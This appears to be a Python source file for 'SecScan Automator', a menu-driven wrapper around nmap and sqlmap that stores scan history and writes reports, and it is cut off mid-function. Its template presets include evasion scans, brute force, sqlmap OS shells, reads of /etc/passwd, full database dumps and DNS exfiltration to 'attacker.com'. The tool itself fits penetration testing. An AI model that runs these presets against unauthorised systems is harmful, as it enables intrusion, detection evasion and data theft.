#!/usr/bin/env python3

import os
import sys
import json
import time
import random
import socket
import sqlite3
import subprocess
import re
import threading
import hashlib
import base64
import csv
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
import signal
from pathlib import Path
import shutil
import zipfile

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    BLINK = '\033[5m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    GRAY = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'

class Icons:
    SCAN = "🔍"
    SHIELD = "🛡️"
    WARNING = "⚠️"
    SUCCESS = "✅"
    ERROR = "❌"
    INFO = "ℹ️"
    ROCKET = "🚀"
    TARGET = "🎯"
    LOCK = "🔒"
    KEY = "🔑"
    GEAR = "⚙️"
    BOOK = "📚"
    CHART = "📊"
    FIRE = "🔥"
    STAR = "⭐"
    ARROW = "➤"
    BULLET = "•"
    DIAMOND = "◆"
    SQUARE = "■"
    CIRCLE = "●"
    CLOCK = "🕐"
    LAPTOP = "💻"
    NETWORK = "🌐"
    DATABASE = "🗄️"
    EXPORT = "📤"
    IMPORT = "📥"
    SEARCH = "🔎"
    FILTER = "🔽"
    BATCH = "📦"
    MONITOR = "📡"
    EXPLOIT = "💥"
    PAYLOAD = "🎯"
    SAVE = "💾"
    FOLDER = "📁"
    TRASH = "🗑️"
    EDIT = "✏️"
    COPY = "📋"
    DOWNLOAD = "⬇️"
    UPLOAD = "⬆️"

class InputValidator:
    @staticmethod
    def validate_menu_choice(choice, max_option):
        try:
            if not choice or not choice.strip():
                return False, "Empty input"
            
            choice = choice.strip()
            
            if not choice.isdigit():
                return False, "Input must be a number"
            
            choice_num = int(choice)
            if choice_num < 0 or choice_num > max_option:
                return False, f"Number must be between 0 and {max_option}"
            
            return True, choice_num
        except ValueError:
            return False, "Invalid number format"
        except Exception:
            return False, "Unknown validation error"
    
    @staticmethod
    def validate_ip(ip):
        if not ip or not isinstance(ip, str):
            return False
        try:
            ipaddress.ip_address(ip.strip())
            return True
        except (ValueError, AttributeError):
            return False
    
    @staticmethod
    def validate_url(url):
        if not url or not isinstance(url, str):
            return False
        try:
            result = urlparse(url.strip())
            return bool(result.scheme and result.netloc)
        except Exception:
            return False
    
    @staticmethod
    def validate_target(target):
        if not target or not isinstance(target, str):
            return False, "empty"
        
        target = target.strip()
        
        if InputValidator.validate_ip(target):
            return True, "ip"
        
        if InputValidator.validate_url(target):
            return True, "url"
        
        if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?(\.[a-zA-Z]{2,})+$', target):
            return True, "domain"
        
        return False, "invalid"
    
    @staticmethod
    def validate_filename(filename):
        if not filename or not isinstance(filename, str):
            return False
        
        invalid_chars = '<>:"/\\|?*'
        return not any(char in filename for char in invalid_chars) and len(filename.strip()) > 0
    
    @staticmethod
    def get_valid_input(prompt, validator_func=None, max_attempts=3):
        attempts = 0
        while attempts < max_attempts:
            try:
                user_input = input(prompt).strip()
                
                if validator_func:
                    is_valid, result = validator_func(user_input)
                    if is_valid:
                        return result
                    else:
                        print(f"{Colors.RED}{Icons.ERROR} {result}{Colors.END}")
                        attempts += 1
                else:
                    return user_input
                    
            except (KeyboardInterrupt, EOFError):
                return None
            except Exception as e:
                print(f"{Colors.RED}{Icons.ERROR} Input error: {e}{Colors.END}")
                attempts += 1
        
        print(f"{Colors.RED}{Icons.ERROR} Maximum attempts reached{Colors.END}")
        return None

class QuoteGenerator:
    QUOTES = [
        "Security is a process, not a product.",
        "The best defense is a good offense!",
        "Every port tells a story.",
        "Vulnerability scanning saves systems.",
        "Penetration testing prevents penetration.",
        "Code without testing is like a lock without a key.",
        "The weakest link defines the strength of the chain.",
        "Security through obscurity is not security.",
        "Trust, but verify... then test again.",
        "A secure system is a tested system.",
        "In cybersecurity, paranoia is a virtue.",
        "The only secure computer is one that's unplugged.",
        "Attack is the best form of defense in pentesting.",
        "Knowledge is power, but verification is security.",
        "Every vulnerability found is a lesson learned."
    ]
    
    @staticmethod
    def get_daily_quote():
        try:
            today = datetime.now().strftime("%Y%m%d")
            random.seed(today)
            return random.choice(QuoteGenerator.QUOTES)
        except Exception:
            return "Stay secure and keep testing!"

class ConfigManager:
    def __init__(self):
        self.config_file = "secscan_config.json"
        self.default_config = {
            'theme': 'dark',
            'username': 'SecScanUser',
            'created_date': datetime.now().isoformat(),
            'total_scans': 0,
            'favorite_scans': [],
            'recent_scans': [],
            'scan_templates': {},
            'target_groups': {},
            'advanced_settings': {
                'auto_save_reports': True,
                'show_progress': True,
                'sound_alerts': False,
                'highlight_keywords': True,
                'report_format': 'html',
                'concurrent_scans': 5,
                'timeout_duration': 300,
                'max_report_age_days': 30,
                'auto_backup': True,
                'export_format': 'json'
            }
        }
        self.config = self._load_config()
        self._lock = threading.Lock()
    
    def _load_config(self):
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    merged_config = self.default_config.copy()
                    self._deep_merge(merged_config, config)
                    return merged_config
            return self.default_config.copy()
        except Exception:
            return self.default_config.copy()
    
    def _deep_merge(self, base_dict, update_dict):
        for key, value in update_dict.items():
            if key in base_dict and isinstance(base_dict[key], dict) and isinstance(value, dict):
                self._deep_merge(base_dict[key], value)
            else:
                base_dict[key] = value
    
    def save_config(self):
        try:
            with self._lock:
                with open(self.config_file, 'w', encoding='utf-8') as f:
                    json.dump(self.config, f, indent=2, ensure_ascii=False)
            return True
        except Exception:
            return False
    
    def get(self, key, default=None):
        try:
            keys = key.split('.')
            value = self.config
            for k in keys:
                value = value.get(k, default)
                if value is None:
                    return default
            return value
        except Exception:
            return default
    
    def set(self, key, value):
        try:
            if not key or value is None:
                return False
            
            keys = key.split('.')
            config = self.config
            
            for k in keys[:-1]:
                if k not in config:
                    config[k] = {}
                config = config[k]
            
            config[keys[-1]] = value
            return self.save_config()
        except Exception:
            return False
    
    def increment_scan_count(self):
        try:
            current_count = self.get('total_scans', 0)
            return self.set('total_scans', current_count + 1)
        except Exception:
            return False
    
    def add_recent_scan(self, scan_info):
        try:
            recent_scans = self.get('recent_scans', [])
            recent_scans.insert(0, scan_info)
            recent_scans = recent_scans[:10]  # Keep only last 10
            return self.set('recent_scans', recent_scans)
        except Exception:
            return False
    
    def backup_config(self, backup_dir="backups"):
        try:
            if not os.path.exists(backup_dir):
                os.makedirs(backup_dir)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = os.path.join(backup_dir, f"config_backup_{timestamp}.json")
            
            shutil.copy2(self.config_file, backup_file)
            return backup_file
        except Exception:
            return None

class DatabaseManager:
    def __init__(self):
        self.db_file = "secscan.db"
        self._lock = threading.Lock()
        self._init_database()
    
    def _init_database(self):
        try:
            conn = sqlite3.connect(self.db_file, timeout=10)
            cursor = conn.cursor()
            
            tables = [
                '''CREATE TABLE IF NOT EXISTS reports (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    target TEXT NOT NULL,
                    scan_type TEXT NOT NULL,
                    mode TEXT NOT NULL,
                    created_date TEXT NOT NULL,
                    file_path TEXT NOT NULL,
                    notes TEXT,
                    status TEXT DEFAULT 'completed',
                    duration REAL DEFAULT 0,
                    vulnerability_count INTEGER DEFAULT 0,
                    risk_score REAL DEFAULT 0,
                    command_used TEXT,
                    file_size INTEGER DEFAULT 0
                )''',
                '''CREATE TABLE IF NOT EXISTS scan_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target TEXT NOT NULL,
                    scan_type TEXT NOT NULL,
                    mode TEXT NOT NULL,
                    command TEXT NOT NULL,
                    result TEXT,
                    duration REAL,
                    created_date TEXT NOT NULL,
                    status TEXT DEFAULT 'completed',
                    ports_found INTEGER DEFAULT 0,
                    vulnerabilities_found INTEGER DEFAULT 0
                )''',
                '''CREATE TABLE IF NOT EXISTS error_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    error_type TEXT NOT NULL,
                    error_message TEXT NOT NULL,
                    stack_trace TEXT,
                    created_date TEXT NOT NULL,
                    severity TEXT DEFAULT 'medium'
                )''',
                '''CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target TEXT UNIQUE NOT NULL,
                    target_type TEXT NOT NULL,
                    group_name TEXT,
                    notes TEXT,
                    last_scanned TEXT,
                    scan_count INTEGER DEFAULT 0,
                    risk_level TEXT DEFAULT 'unknown',
                    created_date TEXT NOT NULL
                )''',
                '''CREATE TABLE IF NOT EXISTS vulnerabilities (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target TEXT NOT NULL,
                    vulnerability_type TEXT NOT NULL,
                    severity TEXT NOT NULL,
                    description TEXT,
                    port INTEGER,
                    service TEXT,
                    discovered_date TEXT NOT NULL,
                    status TEXT DEFAULT 'open'
                )'''
            ]
            
            for table_sql in tables:
                cursor.execute(table_sql)
            
            conn.commit()
            conn.close()
        except sqlite3.Error as e:
            print(f"Database initialization error: {e}")
    
    def _execute_query(self, query, params=None, fetch=False, fetch_one=False):
        try:
            with self._lock:
                conn = sqlite3.connect(self.db_file, timeout=10)
                cursor = conn.cursor()
                
                if params:
                    cursor.execute(query, params)
                else:
                    cursor.execute(query)
                
                if fetch_one:
                    result = cursor.fetchone()
                elif fetch:
                    result = cursor.fetchall()
                else:
                    result = cursor.rowcount > 0
                
                conn.commit()
                conn.close()
                return result
        except sqlite3.Error as e:
            self.log_error("DatabaseError", str(e))
            return [] if fetch else None if fetch_one else False
    
    def add_scan_to_history(self, target, scan_type, mode, command, result="", duration=0, ports_found=0, vulns_found=0):
        query = '''
            INSERT INTO scan_history (target, scan_type, mode, command, result, duration, created_date, ports_found, vulnerabilities_found)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        '''
        params = (target, scan_type, mode, command, result, duration, datetime.now().isoformat(), ports_found, vulns_found)
        return self._execute_query(query, params)
    
    def add_report(self, name, target, scan_type, mode, file_path, notes="", duration=0, vuln_count=0, risk_score=0, command=""):
        try:
            file_size = os.path.getsize(file_path) if os.path.exists(file_path) else 0
            query = '''
                INSERT INTO reports (name, target, scan_type, mode, created_date, file_path, notes, duration, vulnerability_count, risk_score, command_used, file_size)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            '''
            params = (name, target, scan_type, mode, datetime.now().isoformat(), file_path, notes, duration, vuln_count, risk_score, command, file_size)
            return self._execute_query(query, params)
        except Exception as e:
            self.log_error("AddReport", str(e))
            return False
    
    def get_reports(self, limit=50, search_term=None, scan_type=None, date_from=None, date_to=None):
        try:
            query = 'SELECT * FROM reports WHERE 1=1'
            params = []
            
            if search_term:
                query += ' AND (name LIKE ? OR target LIKE ? OR notes LIKE ?)'
                search_pattern = f'%{search_term}%'
                params.extend([search_pattern, search_pattern, search_pattern])
            
            if scan_type:
                query += ' AND scan_type = ?'
                params.append(scan_type)
            
            if date_from:
                query += ' AND created_date >= ?'
                params.append(date_from)
            
            if date_to:
                query += ' AND created_date <= ?'
                params.append(date_to)
            
            query += ' ORDER BY created_date DESC LIMIT ?'
            params.append(limit)
            
            return self._execute_query(query, params, fetch=True)
        except Exception as e:
            self.log_error("GetReports", str(e))
            return []
    
    def delete_report(self, report_id):
        try:
            # First get the file path to delete the file
            report = self._execute_query('SELECT file_path FROM reports WHERE id = ?', (report_id,), fetch_one=True)
            if report and os.path.exists(report[0]):
                os.remove(report[0])
            
            # Then delete the database record
            return self._execute_query('DELETE FROM reports WHERE id = ?', (report_id,))
        except Exception as e:
            self.log_error("DeleteReport", str(e))
            return False
    
    def get_scan_statistics(self):
        try:
            stats = {}
            
            # Total counts
            stats['total_scans'] = self._execute_query('SELECT COUNT(*) FROM scan_history', fetch_one=True)[0] or 0
            stats['total_reports'] = self._execute_query('SELECT COUNT(*) FROM reports', fetch_one=True)[0] or 0
            stats['total_vulnerabilities'] = self._execute_query('SELECT COUNT(*) FROM vulnerabilities', fetch_one=True)[0] or 0
            stats['total_targets'] = self._execute_query('SELECT COUNT(*) FROM targets', fetch_one=True)[0] or 0
            
            # Recent activity (last 7 days)
            week_ago = (datetime.now() - timedelta(days=7)).isoformat()
            stats['recent_scans'] = self._execute_query('SELECT COUNT(*) FROM scan_history WHERE created_date >= ?', (week_ago,), fetch_one=True)[0] or 0
            stats['recent_reports'] = self._execute_query('SELECT COUNT(*) FROM reports WHERE created_date >= ?', (week_ago,), fetch_one=True)[0] or 0
            
            # Scan type breakdown
            nmap_scans = self._execute_query('SELECT COUNT(*) FROM scan_history WHERE scan_type = "nmap"', fetch_one=True)[0] or 0
            sqlmap_scans = self._execute_query('SELECT COUNT(*) FROM scan_history WHERE scan_type = "sqlmap"', fetch_one=True)[0] or 0
            stats['scan_breakdown'] = {'nmap': nmap_scans, 'sqlmap': sqlmap_scans}
            
            # Average scan duration
            avg_duration = self._execute_query('SELECT AVG(duration) FROM scan_history WHERE duration > 0', fetch_one=True)
            stats['average_scan_duration'] = round(avg_duration[0], 2) if avg_duration and avg_duration[0] else 0
            
            # Vulnerability severity breakdown
            critical_vulns = self._execute_query('SELECT COUNT(*) FROM vulnerabilities WHERE severity = "critical"', fetch_one=True)[0] or 0
            high_vulns = self._execute_query('SELECT COUNT(*) FROM vulnerabilities WHERE severity = "high"', fetch_one=True)[0] or 0
            medium_vulns = self._execute_query('SELECT COUNT(*) FROM vulnerabilities WHERE severity = "medium"', fetch_one=True)[0] or 0
            low_vulns = self._execute_query('SELECT COUNT(*) FROM vulnerabilities WHERE severity = "low"', fetch_one=True)[0] or 0
            
            stats['vulnerability_breakdown'] = {
                'critical': critical_vulns,
                'high': high_vulns,
                'medium': medium_vulns,
                'low': low_vulns
            }
            
            # Recent errors count
            stats['recent_errors'] = self._execute_query('SELECT COUNT(*) FROM error_logs WHERE created_date >= ?', (week_ago,), fetch_one=True)[0] or 0
            
            return stats
        except Exception as e:
            self.log_error("GetStatistics", str(e))
            return {'total_scans': 0, 'total_reports': 0, 'total_vulnerabilities': 0, 'total_targets': 0}
    
    def log_error(self, error_type, error_message, stack_trace="", severity="medium"):
        try:
            query = '''
                INSERT INTO error_logs (error_type, error_message, stack_trace, created_date, severity)
                VALUES (?, ?, ?, ?, ?)
            '''
            params = (error_type, error_message, stack_trace, datetime.now().isoformat(), severity)
            return self._execute_query(query, params)
        except Exception:
            return False
    
    def add_target(self, target, target_type, group_name="", notes=""):
        try:
            # Check if target already exists
            existing = self._execute_query('SELECT id FROM targets WHERE target = ?', (target,), fetch_one=True)
            
            if existing:
                # Update existing target
                query = '''
                    UPDATE targets SET last_scanned = ?, scan_count = scan_count + 1, notes = ?
                    WHERE target = ?
                '''
                params = (datetime.now().isoformat(), notes, target)
            else:
                # Insert new target
                query = '''
                    INSERT INTO targets (target, target_type, group_name, notes, last_scanned, scan_count, created_date)
                    VALUES (?, ?, ?, ?, ?, 1, ?)
                '''
                params = (target, target_type, group_name, notes, datetime.now().isoformat(), datetime.now().isoformat())
            
            return self._execute_query(query, params)
        except Exception as e:
            self.log_error("AddTarget", str(e))
            return False
    
    def get_targets(self, group_name=None, limit=100):
        try:
            query = 'SELECT * FROM targets'
            params = []
            
            if group_name:
                query += ' WHERE group_name = ?'
                params.append(group_name)
            
            query += ' ORDER BY last_scanned DESC LIMIT ?'
            params.append(limit)
            
            return self._execute_query(query, params, fetch=True)
        except Exception as e:
            self.log_error("GetTargets", str(e))
            return []
    
    def cleanup_old_data(self, days=30):
        try:
            cutoff_date = (datetime.now() - timedelta(days=days)).isoformat()
            
            # Clean old error logs
            self._execute_query('DELETE FROM error_logs WHERE created_date < ?', (cutoff_date,))
            
            # Clean old scan history (keep important ones)
            self._execute_query('DELETE FROM scan_history WHERE created_date < ? AND vulnerabilities_found = 0', (cutoff_date,))
            
            return True
        except Exception as e:
            self.log_error("CleanupData", str(e))
            return False

class ScanTemplates:
    NMAP_TEMPLATES = {
        'easy': [
            {'name': 'Quick Port Scan', 'command': '-F', 'description': 'Scan most common ports quickly'},
            {'name': 'Basic TCP Scan', 'command': '-sS', 'description': 'SYN scan for port detection'},
            {'name': 'Ping Scan', 'command': '-sn', 'description': 'Check if target is active'},
            {'name': 'OS Detection', 'command': '-O', 'description': 'Detect operating system'},
            {'name': 'Service Version', 'command': '-sV', 'description': 'Detect service versions'},
            {'name': 'UDP Top Ports', 'command': '-sU --top-ports 100', 'description': 'Scan top 100 UDP ports'},
            {'name': 'HTTP Scripts', 'command': '--script http-*', 'description': 'Run HTTP-related scripts'},
            {'name': 'SSL Scripts', 'command': '--script ssl-*', 'description': 'Test SSL/TLS configuration'},
            {'name': 'SMB Scripts', 'command': '--script smb-*', 'description': 'Test SMB shares and security'},
            {'name': 'DNS Scripts', 'command': '--script dns-*', 'description': 'DNS enumeration and testing'}
        ],
        'medium': [
            {'name': 'Comprehensive Scan', 'command': '-A', 'description': 'Aggressive scan with OS and version detection'},
            {'name': 'All Ports Scan', 'command': '-p-', 'description': 'Scan all 65535 ports'},
            {'name': 'Stealth Scan', 'command': '-sS -Pn', 'description': 'Stealth SYN scan without ping'},
            {'name': 'UDP Scan', 'command': '-sU -p 1-1000', 'description': 'Scan first 1000 UDP ports'},
            {'name': 'Script Scan', 'command': '--script default,safe', 'description': 'Run default and safe scripts'},
            {'name': 'Vulnerability Scan', 'command': '--script vuln', 'description': 'Scan for known vulnerabilities'},
            {'name': 'Timing Template 4', 'command': '-T4', 'description': 'Aggressive timing template'},
            {'name': 'Fragment Packets', 'command': '-f', 'description': 'Fragment packets to avoid detection'},
            {'name': 'Decoy Scan', 'command': '-D RND:5', 'description': 'Use random decoy addresses'},
            {'name': 'Source Port', 'command': '--source-port 53', 'description': 'Use DNS source port for evasion'}
        ],
        'hard': [
            {'name': 'Full Stealth Scan', 'command': '-sS -O -sV --script vuln -T4', 'description': 'Complete stealth reconnaissance'},
            {'name': 'Evasion Scan', 'command': '-f -D RND:10 --source-port 53 -T1', 'description': 'Maximum evasion techniques'},
            {'name': 'All Ports + Scripts', 'command': '-p- --script all', 'description': 'Scan all ports with all scripts'},
            {'name': 'Brute Force', 'command': '--script brute', 'description': 'Brute force login attempts'},
            {'name': 'Exploit Scan', 'command': '--script exploit', 'description': 'Test for exploitable vulnerabilities'},
            {'name': 'Malware Detection', 'command': '--script malware', 'description': 'Detect malware infections'},
            {'name': 'Advanced Vuln Scan', 'command': '--script vuln,exploit --script-args unsafe=1', 'description': 'Dangerous vulnerability testing'},
            {'name': 'Firewall Bypass', 'command': '--script firewall-bypass', 'description': 'Test firewall bypass techniques'},
            {'name': 'IDS Evasion', 'command': '--scan-delay 5s --max-rate 1 -T1', 'description': 'Slow scan to evade IDS'},
            {'name': 'IPv6 Scan', 'command': '-6 --script ipv6-*', 'description': 'IPv6 network scanning'}
        ]
    }
    
    SQLMAP_TEMPLATES = {
        'easy': [
            {'name': 'Basic SQL Injection', 'command': '--batch --dbs', 'description': 'Basic SQL injection detection'},
            {'name': 'Cookie Testing', 'command': '--cookie="id=1" --dbs', 'description': 'Test cookies for SQL injection'},
            {'name': 'POST Data Test', 'command': '--data="id=1" --dbs', 'description': 'Test POST data for injection'},
            {'name': 'Get Databases', 'command': '--batch --dbs', 'description': 'Enumerate available databases'},
            {'name': 'Get Tables', 'command': '--batch -D testdb --tables', 'description': 'List tables in database'},
            {'name': 'Get Columns', 'command': '--batch -D testdb -T users --columns', 'description': 'List columns in table'},
            {'name': 'Dump Data', 'command': '--batch -D testdb -T users --dump', 'description': 'Extract data from table'},
            {'name': 'Current User', 'command': '--batch --current-user', 'description': 'Get current database user'},
            {'name': 'Current Database', 'command': '--batch --current-db', 'description': 'Get current database name'},
            {'name': 'Database Users', 'command': '--batch --users', 'description': 'List database users'}
        ],
        'medium': [
            {'name': 'Advanced Detection', 'command': '--batch --level=3 --risk=2 --dbs', 'description': 'Medium risk/level detection'},
            {'name': 'Time-based Blind', 'command': '--batch --technique=T --dbs', 'description': 'Time-based blind SQL injection'},
            {'name': 'Boolean Blind', 'command': '--batch --technique=B --dbs', 'description': 'Boolean-based blind injection'},
            {'name': 'Error-based', 'command': '--batch --technique=E --dbs', 'description': 'Error-based SQL injection'},
            {'name': 'Union-based', 'command': '--batch --technique=U --dbs', 'description': 'Union-based injection'},
            {'name': 'Stacked Queries', 'command': '--batch --technique=S --dbs', 'description': 'Stacked queries injection'},
            {'name': 'WAF Bypass', 'command': '--batch --tamper=space2comment --dbs', 'description': 'Bypass WAF protections'},
            {'name': 'Proxy Usage', 'command': '--batch --proxy=http://127.0.0.1:8080 --dbs', 'description': 'Use proxy for requests'},
            {'name': 'Custom Headers', 'command': '--batch --headers="X-Forwarded-For: 127.0.0.1" --dbs', 'description': 'Add custom headers'},
            {'name': 'Thread Testing', 'command': '--batch --threads=5 --dbs', 'description': 'Multi-threaded testing'}
        ],
        'hard': [
            {'name': 'Maximum Risk', 'command': '--batch --level=5 --risk=3 --dbs', 'description': 'Highest risk and level testing'},
            {'name': 'All Techniques', 'command': '--batch --technique=BEUSTQ --dbs', 'description': 'Use all injection techniques'},
            {'name': 'WAF Evasion', 'command': '--batch --tamper=apostrophemask,apostrophenullencode,base64encode --dbs', 'description': 'Advanced WAF evasion'},
            {'name': 'DNS Exfiltration', 'command': '--batch --dns-domain=attacker.com --dbs', 'description': 'DNS-based data exfiltration'},
            {'name': 'OS Command Exec', 'command': '--batch --os-cmd=whoami', 'description': 'Execute OS commands'},
            {'name': 'SQL Shell', 'command': '--batch --sql-shell', 'description': 'Interactive SQL shell'},
            {'name': 'OS Shell', 'command': '--batch --os-shell', 'description': 'Interactive OS shell'},
            {'name': 'File System', 'command': '--batch --file-read=/etc/passwd', 'description': 'Read system files'},
            {'name': 'Registry Access', 'command': '--batch --reg-read', 'description': 'Windows registry access'},
            {'name': 'Database Takeover', 'command': '--batch --all --exclude-sysdbs', 'description': 'Complete database takeover'}
        ]
    }
    
    @staticmethod
    def get_templates(scan_type, mode):
        try:
            if scan_type == 'nmap':
                return ScanTemplates.NMAP_TEMPLATES.get(mode, [])
            elif scan_type == 'sqlmap':
                return ScanTemplates.SQLMAP_TEMPLATES.get(mode, [])
            return []
        except Exception:
            return []

class AdvancedProgressBar:
    def __init__(self, total=100, width=60, title="Processing"):
        self.total = max(1, total)
        self.width = max(20, width)
        self.title = str(title)[:50]
        self.current = 0
        self.running = False
        self.thread = None
        self.start_time = time.time()
        self.chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        self.char_index = 0
        self._lock = threading.Lock()
        self.current_substep = ""
    
    def start(self):
        try:
            with self._lock:
                if not self.running:
                    self.running = True
                    self.start_time = time.time()
                    self.thread = threading.Thread(target=self._animate)
                    self.thread.daemon = True
                    self.thread.start()
        except Exception:
            pass
    
    def stop(self):
        try:
            with self._lock:
                self.running = False
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=1)
            print()
        except Exception:
            pass
    
    def update(self, current, substep=""):
        try:
            with self._lock:
                self.current = max(0, min(current, self.total))
                self.current_substep = substep[:30]
        except Exception:
            pass
    
    def _animate(self):
        try:
            while self.running:
                with self._lock:
                    percent = (self.current / self.total) * 100
                    filled_width = int((self.current / self.total) * self.width)
                    elapsed = time.time() - self.start_time
                    
                    if percent > 0:
                        eta = (elapsed / percent) * (100 - percent)
                        eta_str = f"ETA: {int(eta//60):02d}:{int(eta%60):02d}"
                    else:
                        eta_str = "ETA: --:--"
                
                bar_color = Colors.GREEN if percent > 75 else Colors.YELLOW if percent > 25 else Colors.RED
                bar = f"{bar_color}{'█' * filled_width}{Colors.GRAY}{'░' * (self.width - filled_width)}{Colors.END}"
                
                spinner = self.chars[self.char_index]
                self.char_index = (self.char_index + 1) % len(self.chars)
                
                elapsed_str = f"{int(elapsed//60):02d}:{int(elapsed%60):02d}"
                
                status_line = f"\r{Colors.CYAN}{spinner} {self.title}{Colors.END} [{bar}] {Colors.BOLD}{percent:5.1f}%{Colors.END}"
                status_line += f" | {Colors.BLUE}{elapsed_str}{Colors.END} | {Colors.YELLOW}{eta_str}{Colors.END}"
                
                if self.current_substep:
                    status_line += f" | {Colors.MAGENTA}{self.current_substep}{Colors.END}"
                
                print(status_line, end='', flush=True)
                time.sleep(0.1)
        except Exception:
            pass

class ReportManager:
    def __init__(self, db_manager):
        self.db_manager = db_manager
        self.reports_dir = "reports"
        self.ensure_reports_directory()
    
    def ensure_reports_directory(self):
        try:
            if not os.path.exists(self.reports_dir):
                os.makedirs(self.reports_dir)
        except Exception:
            pass
    
    def generate_report_filename(self, scan_type, target, mode):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            clean_target = re.sub(r'[^\w\-_\.]', '_', target)[:20]
            filename = f"{scan_type}_{mode}_{clean_target}_{timestamp}"
            return filename
        except Exception:
            return f"scan_report_{int(time.time())}"
    
    def create_html_report(self, scan_data):
        try:
            filename = self.generate_report_filename(scan_data['scan_type'], scan_data['target'], scan_data['mode'])
            filepath = os.path.join(self.reports_dir, f"{filename}.html")
            
            html_content = self._generate_html_content(scan_data)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            return filepath
        except Exception as e:
            self.db_manager.log_error("CreateHTMLReport", str(e))
            return None
    
    def create_text_report(self, scan_data):
        try:
            filename = self.generate_report_filename(scan_data['scan_type'], scan_data['target'], scan_data['mode'])
            filepath = os.path.join(self.reports_dir, f"{filename}.txt")
            
            text_content = self._generate_text_content(scan_data)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(text_content)
            
            return filepath
        except Exception as e:
            self.db_manager.log_error("CreateTextReport", str(e))
            return None
    
    def create_json_report(self, scan_data):
        try:
            filename = self.generate_report_filename(scan_data['scan_type'], scan_data['target'], scan_data['mode'])
            filepath = os.path.join(self.reports_dir, f"{filename}.json")
            
            json_data = {
                'report_metadata': {
                    'generated_at': datetime.now().isoformat(),
                    'tool': 'SecScan Automator',
                    'version': '2.0'
                },
                'scan_information': scan_data,
                'timestamp': datetime.now().isoformat()
            }
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(json_data, f, indent=2, ensure_ascii=False)
            
            return filepath
        except Exception as e:
            self.db_manager.log_error("CreateJSONReport", str(e))
            return None
    
    def _generate_html_content(self, scan_data):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            html_template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecScan Automator - Scan Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', sans-serif; background: #f5f7fa; line-height: 1.6; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 30px; }}
        .header h1 {{ font-size: 2.5em; margin-bottom: 10px; }}
        .card {{ background: white; padding: 25px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); margin-bottom: 20px; }}
        .info-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }}
        .info-item {{ padding: 15px; background: #f8f9fa; border-radius: 8px; border-left: 4px solid #3498db; }}
        .info-label {{ font-weight: bold; color: #2c3e50; }}
        .info-value {{ color: #34495e; margin-top: 5px; }}
        .results {{ background: #2c3e50; color: #ecf0f1; padding: 20px; border-radius: 8px; overflow-x: auto; }}
        .results pre {{ white-space: pre-wrap; word-wrap: break-word; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ SecScan Automator</h1>
            <p>Security Scanning Report</p>
            <p>Generated on {timestamp}</p>
        </div>
        
        <div class="card">
            <h3>📊 Scan Information</h3>
            <div class="info-grid">
                <div class="info-item">
                    <div class="info-label">Scan Type</div>
                    <div class="info-value">{scan_data.get('scan_type', 'Unknown').upper()}</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Target</div>
                    <div class="info-value">{scan_data.get('target', 'Unknown')}</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Mode</div>
                    <div class="info-value">{scan_data.get('mode', 'Unknown').upper()}</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Duration</div>
                    <div class="info-value">{scan_data.get('duration', 0):.2f} seconds</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Command</div>
                    <div class="info-value">{scan_data.get('command', 'Unknown')}</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Status</div>
                    <div class="info-value">Completed</div>
                </div>
            </div>
        </div>
        
        <div class="card">
            <h3>🔍 Scan Results</h3>
            <div class="results">
                <pre>{scan_data.get('result', 'No results available')}</pre>
            </div>
        </div>
        
        {f'<div class="card"><h3>📝 Notes</h3><p>{scan_data.get("notes", "")}</p></div>' if scan_data.get('notes') else ''}
    </div>
</body>
</html>
"""
            return html_template
        except Exception:
            return "<html><body><h1>Error generating report</h1></body></html>"
    
    def _generate_text_content(self, scan_data):
        try:
